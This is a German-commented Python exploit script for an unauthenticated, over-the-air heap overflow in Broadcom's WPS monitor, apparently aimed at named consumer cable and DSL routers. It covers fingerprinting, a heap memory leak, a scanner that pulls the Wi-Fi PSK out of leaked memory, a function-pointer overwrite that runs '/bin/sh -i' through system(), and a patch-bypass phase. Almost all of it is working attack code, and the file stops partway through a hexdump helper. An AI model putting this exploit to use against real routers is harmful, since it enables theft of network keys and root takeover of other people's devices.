#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WPSplinter v8 - Broadcom WPS Monitor Exploit
============================================
Exploit für die Broadcom-WPS-EAP-Fragment-Reassembly-Schwachstelle
("WPSplinter", Hexacon 2026, Quentin Kaiser).

WICHTIG: Es existiert KEIN CVE. Broadcom hat die Zuweisung einer CVE
abgelehnt; "WPSplinter" ist ein von der Forschung vergebener Name [1].

Referenzen:
  [1] https://qkaiser.github.io/broadcom-wps/
  [2] https://quentinkaiser.be/security/2026/10/16/one-parser-two-bugs/
  [10] https://github.com/qkaiser/broadcom-wps

Betroffene Plattformen (SoC-Familien) [1]:
  - eCos:    BCM3380, BCM3383, BCM33834
  - Linux:   BCM3390, BCM63xx, BCM65xx, BCM68xx
  - "forever day" auf eCos-Geräten (kein Fix verfügbar) [4]

Auswirkungen: unauthentifizierte, über Funk erreichbare
Speicheroffenlegung (inkl. WLan-PSK) und Code-Ausführung als root [1][2].

Requirements: Python 3.8+, scapy >= 2.4.5, Interface im Monitor-Modus
"""

import argparse
import logging
import os
import struct
import subprocess
import sys
import time

from scapy.all import (
    sendp, sniff, wrpcap, conf,
    RadioTap, Dot11, Dot11Elt, Dot11Auth,
    LLC, SNAP, Raw, RandMAC,
)
from scapy.layers.dot11 import Dot11AssoReq, Dot11AssoResp, Dot11Deauth, Dot11Disas

ETH_P_PAE = 0x888E                 # EAPOL EtherType
MAC_FRAGMENT_SIZE = 235             # max 802.11-MAC-Fragmentgröße (Wert des
                                     # offiziellen Fingerprinters [10])

logging.basicConfig(level=logging.INFO,
                    format='[%(asctime)s] %(levelname)s: %(message)s',
                    datefmt='%H:%M:%S')
logger = logging.getLogger("wpsplinter")
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# =============================================================================
# Protokoll-Konstanten (WPS/WSC über EAP-Expanded)
# =============================================================================

# --- EAP -------------------------------------------------------------------
EAP_CODE_REQUEST, EAP_CODE_RESPONSE = 1, 2
EAP_CODE_SUCCESS,  EAP_CODE_FAILURE  = 3, 4
EAP_TYPE_IDENTITY = 1
EAP_TYPE_EXPANDED = 254  # 0xFE

# --- EAPOL ------------------------------------------------------------------
# Nummerierung wie im offiziellen Fingerprinter [10]:
#   EAPOL-Start : Version=2, Type=1, Length=0
#   EAP-Packet  : Version=1, Type=0
EAPOL_START_BYTES = b"\x02\x01\x00\x00"
EAPOL_VERSION_EAP = 0x01
EAPOL_TYPE_EAP    = 0x00

# --- WSC (EAP-Expanded Vendor-Bereich) --------------------------------------
WPS_VENDOR     = b"\x00\x37\x2a"          # Vendor-ID: Wi-Fi Alliance
WPS_VENDOR_TYPE = b"\x00\x00\x00\x01"      # Vendor-Type: Simple Config

# WSC-OpCodes: Im Broadcom SDK existieren separate M-OpCodes; hostapd nutzt
# das generische WSC_MSG=0x04 für M1. 0x04 ist in beiden Schemata gültig.
WSC_OP_START  = 0x01
WSC_OP_ACK    = 0x02
WSC_OP_NACK   = 0x03
WSC_OP_MSG_M1 = 0x04
WSC_OP_M2     = 0x05
WSC_OP_M2D    = 0x06
# FRAG-ACK: je nach Implementierung wird OpCode 0x0f (Wi-Fi-SC-Spez.)
# oder 0x03 gemeldet – wir akzeptieren beide [10].
WSC_OP_FRAG_ACK_CANDIDATES = (0x03, 0x0F)

# WSC-Flags (Byte nach dem OpCode)
WSC_FLAG_MF = 0x01   # More Fragments
WSC_FLAG_LF = 0x02   # Length-Field vorhanden

WFA_IDENTITY = b"wfa-simpleconfig-enrollee-1-0"

# --- Broadcom wps_monitor Reassembly-State (Overflow-Ziel) -------------------
# Werte wie im Ursprungsskript ("firmware-verified") als Standard; pro Firmware
# über CLI-Overrides anpassbar. Offsets sind relativ zum Pufferanfang:
#   0..2047                 -> frags_received[0]
#   ab 2048                 -> angrenzende State-Felder
FRAGS_CAP        = 2048
OFF_TOTAL_BYTES  = FRAGS_CAP          # total_bytes_to_recv
OFF_TOTAL_RECV   = FRAGS_CAP + 4     # total_received
OFF_NEXT_FRAG    = FRAGS_CAP + 8     # next_frag_to_send
OFF_FRAG_SIZE    = FRAGS_CAP + 12    # frag_size
OFF_FLAGS        = FRAGS_CAP + 24    # flags
OFF_LAST_SENT    = FRAGS_CAP + 28    # last_sent (Zeiger)
OFF_LAST_SENT_LEN= FRAGS_CAP + 32    # last_sent_len
OFF_SEND_DATA    = FRAGS_CAP + 56    # send_data (Funktionszeiger)

# --- PSK-Erkennung -----------------------------------------------------------
PSK_MIN_LEN, PSK_MAX_LEN = 8, 63
PSK_MARKERS = [b'wpa_psk', b'wpa_passphrase', b'pre_shared_key',
               b'psk=', b'WPA PSK']
PSK_SCAN_OFFSETS = [0x1000, 0x2000, 0x3000, 0x4000, 0x5000]

# --- Geräteprofile (Auswahl bestätigter Geräte aus [1]) ----------------------
# RCE-Konstanten sind CODESUBSTR firmware-spezifisch. Wo keine publizierten
# Adressen existieren, ist 'system_plt' None -> --system_plt erzwingen.
DEVICE_PROFILES = {
    # Name: (arch, endianness, system_plt oder None, Hinweis)
    "bbox3v":        ("mips", "big",    None, "Sagemcom/Proximus BBOX 3V+"),
    "tcg3000":       ("arm",  "little", None, "ASKEY TCG3000 (Orange BE)"),
    "cg3100":        ("mips", "big",    None, "Netgear CG3100 (VOO)"),
    "cg3700":        ("mips", "big",    None, "Netgear CG3700 (VOO)"),
    "tc7210":        ("arm",  "little", None, "Technicolor TC7210 (VOO)"),
    "cga4233":       ("arm",  "little", None, "Technicolor CGA4233 (VOO)"),
    "actiontec":     ("arm",  "little", None, "Actiontec C1000A/C3000A (CenturyLink)"),
    "generic-arm":   ("arm",  "little", None, "Generisch: BCM3390/68xx Linux"),
    "generic-mips":  ("mips", "big",    None, "Generisch: BCM3380/3383 eCos"),
}

SHELL_CMD = b"/bin/sh -i\x00"


# =============================================================================
# EAPOL/EAP-Baukasten (Layout identisch zum offiziellen Fingerprinter [10])
# =============================================================================

def build_eapol(eap_body: bytes, version: int = EAPOL_VERSION_EAP,
               ptype: int = EAPOL_TYPE_EAP) -> bytes:
    """EAPOL-Frame: Version, Type, Length(BE16) + Body."""
    return struct.pack(">BBH", version, ptype, len(eap_body)) + eap_body


def build_eap(code: int, identifier: int, payload_after_type: bytes) -> bytes:
    """EAP-Frame: Code, Id, Length(BE16, inkl. 4-Byte-Header), Type + Body."""
    length = 4 + 1 + len(payload_after_type)
    return (struct.pack(">BBHB", code, identifier, length, EAP_TYPE_EXPANDED)
            + payload_after_type)


def build_identity_response(identifier: int) -> bytes:
    """EAP Identity-Response mit WFA-Enrollee-Identität [10]."""
    length = 5 + len(WFA_IDENTITY)
    eap = struct.pack(">BBHB", EAP_CODE_RESPONSE, identifier, length,
                     EAP_TYPE_IDENTITY) + WFA_IDENTITY
    return build_eapol(eap)


def build_wsc_response(identifier: int, flags: int, data: bytes) -> bytes:
    """
    EAP-Expanded WSC-Response (Enrollee -> AP).

    data = Bytes NACH OpCode/Flags — also inkl. des 2-Byte-Length-Fields,
    falls WSC_FLAG_LF gesetzt ist [10]. EAP-Length = 14 + len(data):
      4 (Header) + 1 (Type) + 3 (VendorID) + 4 (VendorType) + 1 (OpCode)
      + 1 (Flags) + len(data)
    """
    length = 14 + len(data)
    eap = (struct.pack(">BBHB", EAP_CODE_RESPONSE, identifier, length,
                      EAP_TYPE_EXPANDED)
           + WPS_VENDOR + WPS_VENDOR_TYPE
           + struct.pack(">BB", WSC_OP_MSG_M1, flags)
           + data)
    return build_eapol(eap)


# =============================================================================
# AP-Antwort-Parser
# =============================================================================

class ApEap:
    """Zerlegte EAP-Antwort des Access Points."""
    __slots__ = ("code", "identifier", "raw", "opcode", "flags", "lf",
                 "wsc_data")

    def __init__(self, code, identifier, eap):
        self.code, self.identifier, self.raw = code, identifier, eap
        self.opcode = self.flags = self.lf = None
        self.wsc_data = b""
        if (len(eap) >= 14 and eap[4] == EAP_TYPE_EXPANDED
                and eap[5:8] == WPS_VENDOR and eap[8:12] == WPS_VENDOR_TYPE):
            self.opcode = eap[12]
            self.flags = eap[13]
            pos = 14
            if self.flags & WSC_FLAG_LF:
                if len(eap) < pos + 2:
                    return
                self.lf = int.from_bytes(eap[pos:pos + 2], "big")
                pos += 2
            self.wsc_data = eap[pos:]


def parse_eapol(eapol: bytes):
    """EAPOL -> (code, identifier, eap) oder None (Layout aus [10])."""
    if len(eapol) < 8 or eapol[1] != 0:
        return None
    eapol_length = int.from_bytes(eapol[2:4], "big")
    eap = eapol[4:4 + eapol_length]
    if len(eap) < 4:
        return None
    declared = int.from_bytes(eap[2:4], "big")
    if declared < 4 or len(eap) < declared:
        return None
    return eap[0], eap[1], eap[:declared]


# =============================================================================
# WSC-M1 (Standard-TLVs)
# =============================================================================

WSC_TLV_VERSION     = 0x104A
WSC_TLV_MSG_TYPE    = 0x1022
WSC_TLV_UUID_E      = 0x1047
WSC_TLV_MAC_ADDR    = 0x1020
WSC_TLV_NONCE       = 0x101A
WSC_TLV_PUBLIC_KEY  = 0x1032
WSC_TLV_AUTH_FLAGS  = 0x1003
WSC_TLV_ENCR_FLAGS  = 0x100F
WSC_TLV_CONN_FLAGS  = 0x1007
WSC_TLV_CONFIG_METH = 0x1008
WSC_TLV_RF_BANDS    = 0x103C
WSC_TLV_ASSOC_STATE = 0x1002
WSC_TLV_DEVICE_NAME = 0x1011
WSC_TLV_REQUEST_T   = 0x103A


def build_wsc_m1(sta_mac: bytes) -> bytes:
    """Vollständige (formal gültige) M1-Nachricht mit Zufallsdaten."""
    tlvs = b""
    def tlv(t, v):
        return struct.pack(">HH", t, len(v)) + v
    tlvs += tlv(WSC_TLV_VERSION, b"\x10")
    tlvs += tlv(WSC_TLV_MSG_TYPE, b"\x04")                 # M1
    tlvs += tlv(WSC_TLV_UUID_E, os.urandom(16))
    tlvs += tlv(WSC_TLV_MAC_ADDR, sta_mac)
    tlvs += tlv(WSC_TLV_NONCE, os.urandom(16))
    tlvs += tlv(WSC_TLV_PUBLIC_KEY, b"\x11" * 192)         # Platzhalter
    tlvs += tlv(WSC_TLV_AUTH_FLAGS, struct.pack(">H", 0x0020))
    tlvs += tlv(WSC_TLV_ENCR_FLAGS, struct.pack(">H", 0x0008))
    tlvs += tlv(WSC_TLV_CONN_FLAGS, b"\x01")
    tlvs += tlv(WSC_TLV_CONFIG_METH, struct.pack(">H", 0x0008))
    tlvs += tlv(WSC_TLV_RF_BANDS, b"\x01")
    tlvs += tlv(WSC_TLV_ASSOC_STATE, struct.pack(">H", 0))
    tlvs += tlv(WSC_TLV_DEVICE_NAME, b"wpsplinter")
    tlvs += tlv(WSC_TLV_REQUEST_T, b"\x00")
    return tlvs


# =============================================================================
# Overflow-Payload-Builder
# =============================================================================

class OverflowPayload:
    """
    Baut den Heap-Overflow-Payload für den wps_monitor-Reassembly-Puffer.

    - set_buffer_data(): schreibt in frags_received[0] (Bereich 0..2047).
      Wichtig für RCE: Der Befehlsstring muss hier ganz vorne stehen, weil
      last_sent (Pointer auf den Pufferanfang) unverändert bleiben kann und
      send_data(buf, len) dann system(cmd) mit dem Pufferanfang aufruft.
    - write_overflow(): schreibt hinter FRAGS_CAP in die State-Felder.
    """

    def __init__(self):
        self.buffer = bytearray(FRAGS_CAP)
        self.overflow = {}

    def set_buffer_data(self, offset: int, data: bytes):
        end = offset + len(data)
        if offset < 0:
            raise ValueError("offset < 0")
        if end > FRAGS_CAP:
            raise ValueError("buffer data exceeds FRAGS_CAP")
        self.buffer[offset:end] = data

    def write_overflow(self, rel_offset: int, data: bytes):
        if rel_offset < FRAGS_CAP:
            raise ValueError(f"overflow offset must be >= {FRAGS_CAP}")
        self.overflow[rel_offset] = data

    def build(self) -> bytes:
        if not self.overflow:
            return bytes(self.buffer)
        max_end = max(off + len(d) for off, d in self.overflow.items())
        region = bytearray(b"\x00" * (max_end - FRAGS_CAP))
        for off, d in self.overflow.items():
            pos = off - FRAGS_CAP
            region[pos:pos + len(d)] = d
        return bytes(self.buffer) + bytes(region)


# =============================================================================
# Exploit-Klasse
# =============================================================================

class WPSplinter:

    def __init__(self, interface, bssid, ssid, channel=None,
                 arch="arm", big_endian=False, system_plt=None,
                 off_total_bytes=OFF_TOTAL_BYTES,
                 off_last_sent_len=OFF_LAST_SENT_LEN,
                 off_send_data=OFF_SEND_DATA,
                 dump=None, verbose=False, debug=False):
        self.iface = interface
        self.bssid = bssid.lower()
        self.ssid = ssid.encode() if isinstance(ssid, str) else ssid
        self.channel = channel
        self.arch = arch
        self.big_endian = big_endian
        self.system_plt = system_plt
        self.OFF_TOTAL = off_total_bytes
        self.OFF_LAST_SENT_LEN = off_last_sent_len
        self.OFF_SEND_DATA = off_send_data
        self.dump = dump
        self.packfmt = ">I" if big_endian else "<I"

        self.sta = str(RandMAC()).lower()
        self.seq = 0
        self.assoc_ok = False
        self.rx_seen = set()
        self.packets = []

        logger.setLevel(logging.DEBUG if debug
                        else logging.INFO if verbose else logging.WARNING)
        conf.iface = interface
        logger.info(f"[*] iface={interface} bssid={self.bssid} "
                    f"ssid={self.ssid.decode(errors='replace')} arch={arch}")

    # ------------------------------------------------------------------ utils
    def log(self, msg):
        logger.info(msg)

    def _next_seq(self):
        self.seq = (self.seq + 1) & 0xFFF
        return self.seq

    def _mgmt(self, subtype):
        return (RadioTap()
                / Dot11(type=0, subtype=subtype,
                        addr1=self.bssid, addr2=self.sta, addr3=self.bssid))

    def _data_frame(self, eapol: bytes):
        # Layout wie im offiziellen Fingerprinter [10]: ToDS=0x01,
        # LLC/SNAP mit ETH_P_PAE
        return (RadioTap()
                / Dot11(type=2, subtype=0, FCfield=0x01,
                        addr1=self.bssid, addr2=self.sta, addr3=self.bssid,
                        SC=self._next_seq() << 4)
                / LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
                / SNAP(OUI=0, code=ETH_P_PAE)
                / Raw(eapol))

    def _tx(self, eapol: bytes):
        """Senden inkl. 802.11-MAC-Fragmentierung für große Payloads [10]."""
        pkt = self._data_frame(eapol)
        payload = bytes(pkt[Dot11].payload)
        seq = self._next_seq() & 0xFFF
        if len(payload) <= MAC_FRAGMENT_SIZE:
            pkt[Dot11].SC = seq << 4
            sendp(pkt, iface=self.iface, count=1, verbose=False)
            self.packets.append(pkt)
            return
        header = pkt.getlayer(Dot11).copy()
        header.remove_payload()
        frags = []
        for off in range(0, len(payload), MAC_FRAGMENT_SIZE):
            chunk = payload[off:off + MAC_FRAGMENT_SIZE]
            fh = header.copy()
            flags = int(fh.FCfield)
            if off + len(chunk) < len(payload):
                flags |= 0x04          # More Fragments im FCfield
            else:
                flags &= ~0x04
            fh.FCfield = flags
            fh.SC = (seq << 4) | (off // MAC_FRAGMENT_SIZE)
            frags.append(RadioTap() / fh / Raw(chunk))
        for f in frags:
            sendp(f, iface=self.iface, count=1, inter=0.002, verbose=False)
            self.packets.append(f)

    def _rx(self, timeout=3.0, want_any=False):
        """
        Auf EAPOL-EAP-Antwort des AP warten. Gibt ApEap oder None zurück.
        Erkennt zusätzlich Deauth/Disassoc (StationStateLost) [10].
        """
        station, bssid = self.sta, self.bssid

        def wanted(p):
            if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
                return (str(p[Dot11].addr1 or "").lower() == station
                        and str(p[Dot11].addr2 or "").lower() == bssid)
            if not p.haslayer(Dot11) or not p.haslayer(SNAP):
                return False
            d = p[Dot11]
            if (str(d.addr1 or "").lower() != station
                    or str(d.addr2 or "").lower() != bssid
                    or int(p[SNAP].code) != ETH_P_PAE):
                return False
            parsed = parse_eapol(bytes(p[SNAP].payload))
            if parsed is None:
                return False
            eap = parsed[2]
            if not want_any and eap in self.rx_seen:
                return False
            self.rx_seen.add(eap)
            return True

        res = sniff(count=1, timeout=timeout, iface=self.iface,
                    lfilter=wanted, store=True, verbose=0)
        if not res:
            return None
        p = res[0]
        if p.haslayer(Dot11Deauth):
            raise StationStateLost("deauth", int(p[Dot11Deauth].reason))
        if p.haslayer(Dot11Disas):
            raise StationStateLost("disassoc", int(p[Dot11Disas].reason))
        code, ident, eap = parse_eapol(bytes(p[SNAP].payload))
        return ApEap(code, ident, eap)

    # ------------------------------------------------------------- 802.11
    def _check_monitor(self):
        try:
            out = subprocess.run(["iw", "dev", self.iface, "info"],
                                 capture_output=True, text=True, timeout=5)
            if "type monitor" not in out.stdout:
                logger.warning("[!] Interface ist nicht im Monitor-Modus")
        except Exception as e:
            logger.debug(f"iw check failed: {e}")

    def set_channel(self, channel):
        subprocess.run(["iw", "dev", self.iface, "set", "channel",
                       str(channel)], check=False)
        self.channel = channel

    def associate(self):
        """802.11 Auth (Open) + Assoziation mit Statuscode-Prüfung."""
        self._check_monitor()
        if self.channel:
            self.set_channel(self.channel)

        # Authentication Request (MGMT/Subtype 11)
        sendp(RadioTap() / self._mgmt(11) / Dot11Auth(
            algo=0, seqnum=1, status=0),
            iface=self.iface, count=1, verbose=0)
        t_end = time.monotonic() + 3.0
        auth_ok = False
        while time.monotonic() < t_end:
            res = sniff(count=1, timeout=0.8, iface=self.iface,
                        lfilter=lambda p: (p.haslayer(Dot11Auth)
                                           and str(p[Dot11].addr1).lower()
                                           == self.sta),
                        store=1, verbose=0)
            if res and int(res[0][Dot11Auth].status) == 0:
                auth_ok = True
                break
        if not auth_ok:
            logger.warning("[-] Keine erfolgreiche Auth-Antwort (weiter)")
        else:
            self.log("[+] Auth erfolgreich")

        # Association Request (MGMT/Subtype 0) mit SSID/Rates/DSset
        assoc = (self._mgmt(0)
                 / Dot11AssoReq(cap=0x0431, listen_interval=3)
                 / Dot11Elt(ID="SSID", info=self.ssid)
                 / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
                 / Dot11Elt(ID="DSset", info=bytes([self.channel or 6])))
        assoc[Dot11].SC = self._next_seq() << 4
        sendp(assoc, iface=self.iface, count=1, verbose=0)
        self.packets.append(assoc)

        t_end = time.monotonic() + 3.0
        while time.monotonic() < t_end:
            res = sniff(count=1, timeout=0.8, iface=self.iface,
                        lfilter=lambda p: (p.haslayer(Dot11AssoResp)
                                           and str(p[Dot11].addr1).lower()
                                           == self.sta),
                        store=1, verbose=0)
            if res:
                if int(res[0][Dot11AssoResp].status) == 0:
                    self.log("[+] Assoziation erfolgreich")
                    self.assoc_ok = True
                    return True
                logger.error(f"[-] Assoziation abgelehnt "
                             f"(status={res[0][Dot11AssoResp].status})")
                return False
        logger.warning("[-] Keine Assoz-Antwort (fahren fort)")
        self.assoc_ok = True
        return True

    # ------------------------------------------------------- WPS-Einstieg
    def start_wps(self) -> int:
        """
        EAPOL-Start -> Identity-Response -> warten auf WSC-Start-Anfrage des AP
        [10]. Gibt den AP-EAP-Identifier zurück, den alle folgenden Responses
        benutzen MÜSSEN (der AP übergibt ihn, wir erfinden ihn nicht!).
        """
        self.rx_seen = set()
        self._tx(EAPOL_START_BYTES)
        deadline = time.monotonic() + 10.0
        while time.monotonic() < deadline:
            try:
                ap = self._rx(timeout=2.0, want_any=True)
            except StationStateLost:
                raise
            if ap is None:
                self._tx(EAPOL_START_BYTES)
                continue
            if (ap.code == EAP_CODE_REQUEST and len(ap.raw) >= 5
                    and ap.raw[4] == EAP_TYPE_IDENTITY):
                self._tx(build_identity_response(ap.identifier))
                continue
            if (ap.code == EAP_CODE_REQUEST and len(ap.raw) >= 14
                    and ap.raw[12] == WSC_OP_START):
                self.log(f"[+] WPS-Session aktiv (Identifier={ap.identifier})")
                return ap.identifier
        raise WpsError("WPS-Einstieg erfolglos (Timeout)")

    def send_wsc(self, identifier, flags, data, retransmits=3):
        """WSC-Response senden und auf die AP-Reaktion warten (Retransmit)."""
        frame = build_wsc_response(identifier, flags, data)
        for attempt in range(retransmits):
            self._tx(frame)
            try:
                ap = self._rx(timeout=2.5)
            except StationStateLost as e:
                return ("LOST", e)
            if ap is not None:
                return ("EAP", ap)
        return ("TIMEOUT", None)

    # ============================================================ Phase 1
    def phase_fingerprint(self) -> bool:
        """
        Offizieller, nicht-invasiver Differenzial-Fingerprint [10]:
        Ein Fragment mit DEKLARIERTER GESAMTLÄNGE 0 und leerem Payload
        senden (Flags = L|M). Kein Fortsetzungs-Fragment — sonst bleibt der
        Broadcom-Reassembly-State bis zum Timeout blockiert [10].

          hostapd        -> EAP-Request mit OpCode FRAG_ACK -> PATCHED
          wps_monitor    -> EAP-Failure (Code 4) bzw. NACK oder
                           Deauth reason=0 -> LIKELY_VULNERABLE [10]
        """
        self.log("[*] Phase 1: Fingerprinting (Zero-Length-Differenzial)...")
        if not self.assoc_ok and not self.associate():
            return False
        ident = self.start_wps()

        data = struct.pack(">H", 0)         # deklarierte Gesamtlänge: 0
        result = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF, data)
        kind, payload = result

        if kind == "LOST" and getattr(payload, "reason", None) == 0:
            self.log("[+] Deauth reason=0 -> wps_monitor -> LIKELY_VULNERABLE")
            return True
        if kind != "EAP":
            self.log("[-] Keine Reaktion -> INCONCLUSIVE")
            return False
        ap = payload
        if ap.code == EAP_CODE_FAILURE:
            self.log("[+] EAP-Failure auf total=0 -> wps_monitor -> "
                     "LIKELY_VULNERABLE [10]")
            return True
        if ap.opcode is not None and ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES:
            self.log("[-] FRAG-ACK erhalten -> hostapd-Basis -> PATCHED [10]")
            return False
        if ap.opcode == WSC_OP_NACK:
            self.log("[+] WSC-NACK -> wps_monitor -> LIKELY_VULNERABLE")
            return True
        self.log("[?] Unerwartete Antwort -> INCONCLUSIVE")
        return False

    # ============================================================ Phase 1b
    def phase_vuln_probe(self) -> bool:
        """
        Tiefe Überprüfung: erstes Fragment mit ÜBERGROSSER deklarierter
        Gesamtlänge (FRAGS_CAP + 512) senden. Ein verwundbarer wps_monitor
        quittiert mit FRAG-ACK, bevor der Overflow über das zweite Fragment
        vollzogen würde. Kein Fortsetzungs-Fragment -> nicht-invasiv.
        """
        self.log("[*] Phase 1b: Overflow-Fähigkeits-Test (oversize total)...")
        if not self.assoc_ok and not self.associate():
            return False
        ident = self.start_wps()
        total = FRAGS_CAP + 512
        data = struct.pack(">H", total & 0xFFFF) + b"\x41" * 256
        kind, payload = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF, data)
        if kind == "EAP" and payload.opcode in WSC_OP_FRAG_ACK_CANDIDATES:
            self.log(f"[+] FRAG-ACK auf total={total} -> Reassembly akzeptiert "
                    "Überschreitung -> verwundbar")
            return True
        self.log("[-] Kein FRAG-ACK auf oversize total -> evtl. 2018-Patch "
                 "oder hostapd")
        return False

    # ============================================================ Phase 2
    def phase_leak(self, target_offset=0, leak_size=1024) -> bytes:
        """
        Speicher-Offenlegung über last_sent_len-Überschreibung.

        Technik (gerätespezifisch zu verifizieren [2]): wir überlaufen den
        Reassembly-Puffer so, dass 'last_sent_len' auf (FRAGS_CAP +
        leak_size) gesetzt wird. Der Puffer-Zeiger (last_sent) bleibt
        unangetastet. Sendet der AP das Fragment zurück, enthält die
        Antwort mehr Bytes als wir hineingeschrieben haben — der Überschuss
        stammt aus dem Heap hinter dem Puffer (Memory Disclosure [1][2]).
        """
        self.log(f"[*] Phase 2: Leak {leak_size} B ab Puffer ausgehend...")
        if not self.assoc_ok and not self.associate():
            return b""
        ident = self.start_wps()

        ov = OverflowPayload()
        ov.set_buffer_data(0, b"\x41" * FRAGS_CAP)              # Puffer füllen
        ov.write_overflow(self.OFF_TOTAL, struct.pack(self.packfmt,
                                                      FRAGS_CAP + leak_size))
        ov.write_overflow(OFF_TOTAL_RECV, struct.pack(self.packfmt, 0))
        ov.write_overflow(self.OFF_LAST_SENT_LEN,
                          struct.pack(self.packfmt, FRAGS_CAP + leak_size))
        payload = ov.build()

        sent_by_us = {bytes(payload)}
        kind, ap = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF,
                                 struct.pack(">H", len(payload) & 0xFFFF)
                                 + payload[:1024])
        if kind != "EAP" or not (ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES):
            self.log("[-] Erstes Fragment nicht bestätigt")
            return b""

        # Kontinuations-Fragment: der verbleibende Rest des Payloads läuft
        # über den Pufferanfang hinaus und überschreibt die State-Felder.
        rest = payload[1024:]
        kind, ap = self.send_wsc(ident, WSC_FLAG_MF, rest)
        if kind != "EAP":
            self.log("[-] Kontinuation nicht bestätigt")
            return b""

        collected = b""
        t_end = time.monotonic() + 5.0
        while time.monotonic() < t_end:
            try:
                ap = self._rx(timeout=1.5)
            except StationStateLost:
                break
            if ap is None:
                break
            d = ap.wsc_data
            if d and bytes(d) not in sent_by_us:
                collected += bytes(d)
        self.log(f"[+] {len(collected)} B Antwortdaten (potenzieller Leak)")
        return collected

    # ============================================================ Phase 3
    def scan_for_psk(self, memory: bytes) -> list:
        out = []
        for marker in PSK_MARKERS:
            pos = memory.find(marker)
            while pos != -1:
                window = memory[pos + len(marker):pos + len(marker) + 128]
                nul = window.find(b"\x00")
                cand = window if nul == -1 else window[:nul]
                if PSK_MIN_LEN <= len(cand) <= PSK_MAX_LEN:
                    try:
                        t = cand.decode("ascii")
                        if all(32 <= ord(c) <= 126 for c in t):
                            out.append(t)
                    except UnicodeDecodeError:
                        pass
                pos = memory.find(marker, pos + 1)
        return sorted(set(out))

    def phase_extract_psk(self, scan_size=4096, base_offset=0) -> list:
        self.log("[*] Phase 3: PSK-Extraktion...")
        found = []
        offsets = [base_offset] if base_offset else PSK_SCAN_OFFSETS
        for off in offsets:
            data = self.phase_leak(target_offset=off, leak_size=scan_size)
            if data:
                found.extend(self.scan_for_psk(data))
        found = sorted(set(found))
        if found:
            print("=" * 60)
            print("PSK-KANDIDATEN (mit wpa_passphrase <SSID> <PSK> prüfen):")
            for i, p in enumerate(found, 1):
                print(f"  [{i}] {p}")
            print("=" * 60)
        else:
            self.log("[-] Keine PSK-Kandidaten gefunden")
        return found

    # ============================================================ Phase 4
    def phase_rce(self, cmd: bytes, system_plt=None) -> bool:
        """
        Code-Ausführung über send_data-Funktionszeiger-Überschreibung [1][2].

        - cmd (nullterminiert) liegt am PUFERANFANG: last_sent zeigt
          unverändert auf den Pufferstart; der Aufruf send_data(buf, len)
        - wird zu system(cmd), da system zusätzliche Argumente ignoriert.
        - Der 16-Bit-Integer-Underflow des 2018er Patches [2] erlaubt dem
          wilden memcpy weiterhin, die State-Felder zu überschreiben.
        """
        if isinstance(cmd, str):
            cmd = cmd.encode()
        if not cmd.endswith(b"\x00"):
            cmd += b"\x00"
        plt = system_plt or self.system_plt
        if not plt:
            raise WpsError("RCE braucht --system_plt (firmware-spezifisch!)")
        self.log(f"[*] Phase 4: RCE cmd={cmd!r} system@{plt:#x}")

        if not self.assoc_ok and not self.associate():
            return False
        ident = self.start_wps()

        ov = OverflowPayload()
        ov.set_buffer_data(0, cmd)                            # Befehl vorn
        ov.write_overflow(self.OFF_SEND_DATA,
                          struct.pack(self.packfmt, plt))
        payload = ov.build()

        kind, ap = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF,
                                 struct.pack(">H", len(payload) & 0xFFFF)
                                 + payload[:1024])
        if kind != "EAP" or not (ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES):
            self.log("[-] Erstes Fragment nicht bestätigt")
            return False
        rest = payload[1024:]
        send_wsc_kwargs = dict(ident=ident)
        frame = build_wsc_response(ident, WSC_FLAG_MF, rest)
        self._tx(frame)
        self.log("[*] Overflow übermittelt — warte auf Retransmit-Timer...")
        time.sleep(6)          # Timer (ca. 5 s) triggert send_data-Callback
        self.log("[+] RCE-Payload gesendet")
        return True

    def phase_shell(self):
        return self.phase_rce(SHELL_CMD)

    # ===================================================== Phase: M2D-Leak
    def phase_m2d_leak(self) -> bytes:
        """
        M2D-Zweit-Bug: Integer-Overread in der M2D-Antwort [2].
        Wir senden eine gültige M1 und sammeln die M2/M2D-Daten aller
        AP-Antworten — überzählige Bytes jenseits der deklarierten TLV-Länge
        sind der Offenlegungs-Anteil.
        """
        self.log("[*] Phase: M2D-Overread...")
        if not self.assoc_ok and not self.associate():
            return b""
        ident = self.start_wps()
        m1 = build_wsc_m1(bytes.fromhex(self.sta.replace(":", "")))
        self._tx(build_wsc_response(ident, 0, m1))
        collected = b""
        t_end = time.monotonic() + 6.0
        while time.monotonic() < t_end:
            try:
                ap = self._rx(timeout=1.5)
            except StationStateLost:
                break
            if ap is None:
                break
            if ap.opcode in (WSC_OP_M2, WSC_OP_M2D):
                collected += ap.wsc_data
                self.log(f"[+] M2/M2D empfangen ({len(ap.wsc_data)} B)")
        return collected

    # ================================================= Phase: 2018-Bypass
    def phase_bypass_2018(self) -> bool:
        """
        Umgehung des stillen 2018er Patches: die hinzugefügten Bounds-Checks
        erlauben weiterhin einen Integer-Underflow bis zum memcpy [2].
        Wir deklarieren die Gesamtlänge als 0xFFFF (16-Bit-Längefeld),
        sodass die Prüfung (capacity - used) unterläuft.
        """
        self.log("[*] Phase: 2018-Patch-Bypass (Integer-Underflow) [2]...")
        if not self.assoc_ok and not self.associate():
            return False
        ident = self.start_wps()
        data = struct.pack(">H", 0xFFFF) + b"\x41" * 512
        kind, ap = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF, data)
        if kind == "EAP" and ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES:
            self.log("[+] FRAG-ACK auf total=0xFFFF — Patch-Bypass aktiv")
            return True
        self.log("[-] Kein FRAG-ACK — evtl. voll gepatcht oder hostapd")
        return False

    # ------------------------------------------------------------ Utilities
    def hexdump(self, data, width=16):
        for off in range(0, len(data), width):
            chunk = data[off:off + width]
            hexs = " ".join(f"{b:02x}" for b in chunk)
            txt = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
